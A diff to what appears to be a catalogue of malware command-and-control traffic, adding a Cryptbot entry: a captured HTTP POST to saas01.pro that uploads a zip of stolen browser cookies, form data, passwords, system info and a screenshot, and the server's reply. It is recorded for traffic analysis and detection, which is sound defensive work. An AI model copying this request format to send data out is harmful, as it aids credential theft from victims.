@@ -272,6 +272,40 @@ Content-Length: 0
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cobaltstrike.png "Cobaltstrike")
 
+#### Cryptbot
+~~~
+POST /index.php HTTP/1.1
+Content-Type: multipart/form-data; boundary=---------------------------j3v66jdmskc244S
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
+Host: saas01.pro
+Content-Length: 50253
+Cache-Control: no-cache
+
+-----------------------------j3v66jdmskc244S
+Content-Disposition: form-data; name="file"; filename="C:\ProgramData\AaZ2SXQu2BSEGVOA\SS5KbUwQhOLk.zip"
+Content-Type: application/octet-stream
+
+PK.........S_O\...........4...Browsers/Cookies/Mozilla_Firefox_Cookies_fmcIYbZ.txtUT
+.....]...]...]..KO.@......SZ...hg.	..!<..n.<..P.....^.n.....|....7.W}:..=..e.....4Yl..S.\I..n...z......C..G.....F.,O....*..]gg........<.t>.=.......fY..ce2...Uo..t...6..$!.$...q<.
+..y.KF. p.h$.$..V.Ht".,../.-K.'T..p..B[c........?...&.S.."...b.J.T......(...!B.E1...D\!*N.!....PK.........S_O..K.............Browsers/_FileCookies.txtUT
+.....]...]...]..KO.@.......t.....%&H"...J.!3S.0.60......;......ht.\x.}5.....b/...=...|3a.
+.Zi.v...0...pj....=.]..<...........D...g=o.5..!..}...M..k..s......Y1,7........&.s. ....W.G..yn*F.$...$...wN.LL.J,%.(.-K}A.......q..h.J....?T.M...'.L)!".JK...p7..?.A!o...Ql8l....Z...0.}.PK.........S_OFq..O...h.......Browsers/_FileForms.txtUT
+.....]...]...].K.M.Rp.,*...2...j.8,1..(...T.......V...MQPbJQfz~1/./.SQ~yqj...o~UfNN".....
+^..PK.........S_OE.%.{...........Browsers/_FilePasswords.txtUT
+.....PA..N6.....).......a.?.C.........g.|......kiQ......^.."./.......:.R.y...7...]}.45.{.D..S]......d*nY.q!.3........P.R.C.....G.B	."...;.o.5....iU.;....$}._..&...e@...wF..PK...........S_O\...........4.	....... .......Browsers/Cookies/Mozilla_Firefox_Cookies_fmcIYbZ.txtUT......]PK...........S_O..K...........	....... ...g...Browsers/_FileCookies.txtUT......]PK...........S_OFq..O...h.....	....... .......Browsers/_FileForms.txtUT......]PK...........S_OE.%.{.........	....... ...I...Browsers/_FilePasswords.txtUT......]PK...........S_OE.%.{.........	....... ......._FilePasswords.txtUT......]PK...........S_O.....	..Fk..	.	....... ......._Info.txtUT......]PK...........S_O..=mK.........	....... ......._Screen.jpgUT......]PK..........&.........
+-----------------------------j3v66jdmskc244S--
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Thu, 31 Oct 2019 10:30:07 GMT
+Content-Length: 3
+Connection: keep-alive
+X-Powered-By: Express
+
+ok!
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cryptbot.png "Cryptbot")
+
 #### Danabot
 Not real TLS traffic, flag on "24 01 00 00" pattern and 24 byte first packet 
 ~~~
